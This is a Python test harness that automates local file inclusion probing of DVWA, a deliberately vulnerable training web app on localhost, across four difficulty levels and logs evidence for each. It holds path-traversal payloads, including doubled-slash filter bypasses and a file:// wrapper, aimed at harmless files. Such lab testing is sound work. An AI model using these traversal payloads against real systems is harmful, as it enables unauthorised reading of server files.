#!/usr/bin/env python3
import argparse
import hashlib
import json
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


TZ = timezone(timedelta(hours=8))
DIFFICULTIES = ["low", "medium", "high", "impossible"]
MODULE_ROUTE = "vulnerabilities/fi/"


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def page_text(html):
    return " ".join(BeautifulSoup(html, "html.parser").get_text(" ").split())


def extract_token(html):
    soup = BeautifulSoup(html, "html.parser")
    field = soup.find("input", {"name": "user_token"})
    return field.get("value") if field else None


def extract_page_links(html):
    soup = BeautifulSoup(html, "html.parser")
    return [a.get("href") for a in soup.select("a[href]") if a.get("href") and "page=" in a.get("href")]


def marker_context(text, marker):
    index = text.find(marker)
    if index < 0:
        return ""
    start = max(0, index - 80)
    end = min(len(text), index + len(marker) + 180)
    return text[start:end]


def classify(html):
    text = page_text(html)
    markers = []
    contexts = {}
    marker_map = {
        "robots_txt": "User-agent: *",
        "robots_disallow": "Disallow: /",
        "file1": "File 1",
        "file4_hidden": "File 4 (Hidden)",
        "file4_good_job": "Good job!",
        "not_found": "ERROR: File not found!",
        "include_warning": "include()",
        "warning": "Warning",
        "allow_url_include_note": "The PHP function allow_url_include is not enabled",
    }
    for name, marker in marker_map.items():
        if marker in text:
            markers.append(name)
            contexts[name] = marker_context(text, marker)
    if not markers:
        markers.append("no_known_marker")
    return markers, contexts, text


def safe_name(value):
    return "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in value)


class Harness:
    def __init__(self, base_url, dvwa_user, dvwa_password, source_path, out_dir, proxy=None):
        self.base_url = base_url if base_url.endswith("/") else base_url + "/"
        self.dvwa_user = dvwa_user
        self.dvwa_password = dvwa_password
        self.source_path = Path(source_path)
        self.out_dir = Path(out_dir)
        self.requests_dir = self.out_dir / "requests"
        self.log_path = self.out_dir / "operation-log.jsonl"
        self.json_path = self.out_dir / "report.json"
        self.session = requests.Session()
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.started = time.perf_counter()
        self.results = []
        self.total_requests = 0

    def log(self, difficulty, tool, action, input_summary, output_summary, duration_s=None, evidence_path=None):
        entry = {
            "ts": now_iso(),
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "difficulty": difficulty,
            "tool": tool,
            "action": action,
            "input_summary": input_summary,
            "output_summary": output_summary,
            "duration_s": round(duration_s, 3) if duration_s is not None else None,
            "evidence_path": evidence_path,
        }
        with self.log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def request(self, method, route, difficulty, label, **kwargs):
        start = time.perf_counter()
        resp = self.session.request(
            method,
            urljoin(self.base_url, route),
            proxies=self.proxies,
            allow_redirects=True,
            timeout=20,
            **kwargs,
        )
        duration = time.perf_counter() - start
        self.total_requests += 1
        markers, contexts, text = classify(resp.text)
        fields = kwargs.get("params") or kwargs.get("data") or {}
        evidence = {
            "method": method,
            "url": resp.url,
            "status_code": resp.status_code,
            "elapsed_s": round(duration, 3),
            "request_fields": fields,
            "response_len": len(resp.text),
            "markers": markers,
            "marker_contexts": contexts,
            "snippet": text[:700],
        }
        path = self.requests_dir / f"{safe_name(difficulty)}-{safe_name(label)}.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(
            difficulty,
            "python-requests",
            label,
            f"{method} {route} fields={list(fields.keys())}",
            f"status={resp.status_code} markers={markers} elapsed={duration:.3f}s",
            duration,
            str(path.relative_to(self.out_dir)),
        )
        return resp, evidence

    def get(self, route, difficulty, label, **kwargs):
        return self.request("GET", route, difficulty, label, **kwargs)

    def post(self, route, difficulty, label, **kwargs):
        return self.request("POST", route, difficulty, label, **kwargs)

    def login(self):
        resp, _ = self.get("login.php", "setup", "fetch-login-form")
        data = {
            "username": self.dvwa_user,
            "password": self.dvwa_password,
            "Login": "Login",
            "user_token": extract_token(resp.text),
        }
        resp, _ = self.post("login.php", "setup", "submit-dvwa-login", data=data)
        authenticated = "Logout" in resp.text or "Damn Vulnerable Web Application" in resp.text
        self.log("setup", "auth", "login-result", "DVWA credentials supplied by user", f"authenticated={authenticated}")
        if not authenticated:
            raise RuntimeError("DVWA login did not produce an authenticated page")

    def set_security(self, difficulty):
        resp, _ = self.get("security.php", difficulty, "fetch-security-form")
        data = {"security": difficulty, "seclev_submit": "Submit", "user_token": extract_token(resp.text)}
        self.post("security.php", difficulty, "set-security", data=data)
        cookie_level = self.session.cookies.get("security")
        self.log(difficulty, "dvwa", "security-cookie", f"requested={difficulty}", f"cookie={cookie_level}")

    def inspect_module(self, difficulty):
        resp, evidence = self.get(MODULE_ROUTE, difficulty, "inspect-module")
        links = extract_page_links(resp.text)
        evidence["page_links"] = links
        evidence["security_cookie"] = self.session.cookies.get("security")
        path = self.requests_dir / f"{difficulty}-inspect-module.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(difficulty, "html-parser", "page-links", "a[href*=page=]", json.dumps(links, ensure_ascii=False))
        return links

    def source_metadata(self, difficulty):
        source_file = self.source_path / "vulnerabilities" / "fi" / "source" / f"{difficulty}.php"
        data = source_file.read_bytes()
        meta = {
            "path": str(source_file),
            "size_bytes": source_file.stat().st_size,
            "sha256": hashlib.sha256(data).hexdigest(),
            "mtime": datetime.fromtimestamp(source_file.stat().st_mtime, TZ).isoformat(timespec="seconds"),
        }
        self.log(difficulty, "source-review", f"read {difficulty}.php", str(source_file), f"sha256={meta['sha256'][:16]}")
        return meta

    def level_plan(self, difficulty):
        if difficulty == "low":
            return [
                ("baseline-include", "include.php", "baseline"),
                ("valid-listed-file1", "file1.php", "valid"),
                ("invalid-missing-file", "no_such_file_20260608.php", "negative"),
                ("proof-traversal-robots", "../../robots.txt", "proof"),
                ("proof-hidden-file4", "file4.php", "secondary_proof"),
            ]
        if difficulty == "medium":
            return [
                ("baseline-include", "include.php", "baseline"),
                ("blocked-simple-traversal", "../../robots.txt", "blocked_probe"),
                ("proof-doubled-slash-traversal", "....//....//robots.txt", "proof"),
                ("proof-doubled-backslash-traversal", "....\\\\....\\\\robots.txt", "secondary_proof"),
                ("proof-hidden-file4", "file4.php", "secondary_proof"),
            ]
        if difficulty == "high":
            return [
                ("baseline-include", "include.php", "baseline"),
                ("blocked-simple-traversal", "../../robots.txt", "blocked_probe"),
                ("proof-hidden-file4", "file4.php", "secondary_proof"),
                ("proof-file-wrapper-robots", "file://D:/phpStudy/PHPTutorial/WWW/DVWA/robots.txt", "proof"),
            ]
        return [
            ("baseline-include", "include.php", "baseline"),
            ("valid-listed-file1", "file1.php", "valid"),
            ("rejected-simple-traversal", "../../robots.txt", "defense_probe"),
            ("rejected-hidden-file4", "file4.php", "defense_probe"),
            ("rejected-file-wrapper-robots", "file://D:/phpStudy/PHPTutorial/WWW/DVWA/robots.txt", "defense_probe"),
        ]

    def request_page(self, difficulty, page_value, label):
        _, evidence = self.get(MODULE_ROUTE, difficulty, label, params={"page": page_value})
        evidence["page_value"] = page_value
        return evidence

    def run_level(self, difficulty):
        level_start = time.perf_counter()
        requests_before = self.total_requests
        self.set_security(difficulty)
        links = self.inspect_module(difficulty)
        source = self.source_metadata(difficulty)
        plan = self.level_plan(difficulty)
        self.log(difficulty, "test-plan", "generated-file-inclusion-probes", "source-derived harmless local file probes", json.dumps(plan, ensure_ascii=False))
        attempts = []
        status = "not_run"
        proof = None
        stop_reason = ""

        for label, page_value, purpose in plan:
            evidence = self.request_page(difficulty, page_value, label)
            evidence["purpose"] = purpose
            attempts.append(evidence)
            if purpose == "proof" and ("robots_txt" in evidence["markers"] or "file4_hidden" in evidence["markers"]):
                status = "solved_vulnerable"
                proof = {"page": page_value, "markers": evidence["markers"]}
                stop_reason = "response contained source-derived harmless local file inclusion marker"
                if difficulty != "impossible":
                    break

        if difficulty == "impossible":
            rejected = [
                a for a in attempts
                if a.get("purpose") == "defense_probe"
                and "not_found" in a["markers"]
                and "robots_txt" not in a["markers"]
                and "file4_hidden" not in a["markers"]
            ]
            if len(rejected) == 3:
                status = "defended_not_vulnerable"
                stop_reason = "strict filename allowlist rejected traversal, hidden file, and file wrapper probes"
            else:
                status = "inconclusive"
                stop_reason = "defense probes did not produce the expected rejection pattern"
        elif status == "not_run":
            status = "inconclusive"
            stop_reason = "small harmless probe set did not produce inclusion proof"

        elapsed = time.perf_counter() - level_start
        result = {
            "difficulty": difficulty,
            "status": status,
            "stop_reason": stop_reason,
            "proof": proof,
            "page_links": links,
            "source": source,
            "attempts": attempts,
            "request_count": self.total_requests - requests_before,
            "level_elapsed_s": round(elapsed, 3),
        }
        self.results.append(result)
        self.log(difficulty, "harness", "level-conclusion", difficulty, f"{status}; {stop_reason}", elapsed)
        return result

    def run(self):
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.requests_dir.mkdir(parents=True, exist_ok=True)
        if self.log_path.exists():
            self.log_path.unlink()
        run_started = now_iso()
        self.login()
        stop_after = None
        for difficulty in DIFFICULTIES:
            result = self.run_level(difficulty)
            if result["status"] in ("defended_not_vulnerable", "blocked", "inconclusive"):
                stop_after = difficulty
                break
        run_finished = now_iso()
        payload = {
            "target": self.base_url,
            "module": "File Inclusion",
            "run_started": run_started,
            "run_finished": run_finished,
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "stop_after": stop_after,
            "total_requests": self.total_requests,
            "results": self.results,
            "operation_log": str(self.log_path),
        }
        self.json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        print(json.dumps(payload, ensure_ascii=False, indent=2))


def main():
    parser = argparse.ArgumentParser(description="DVWA File Inclusion progression harness generated from live page/source inspection.")
    parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--dvwa-user", default="admin")
    parser.add_argument("--dvwa-password", default="password")
    parser.add_argument("--source-path", default=r"D:\phpStudy\PHPTutorial\WWW\DVWA")
    parser.add_argument("--out-dir", required=True)
    parser.add_argument("--proxy", default=None)
    args = parser.parse_args()
    Harness(args.base_url, args.dvwa_user, args.dvwa_password, args.source_path, args.out_dir, args.proxy).run()


if __name__ == "__main__":
    main()
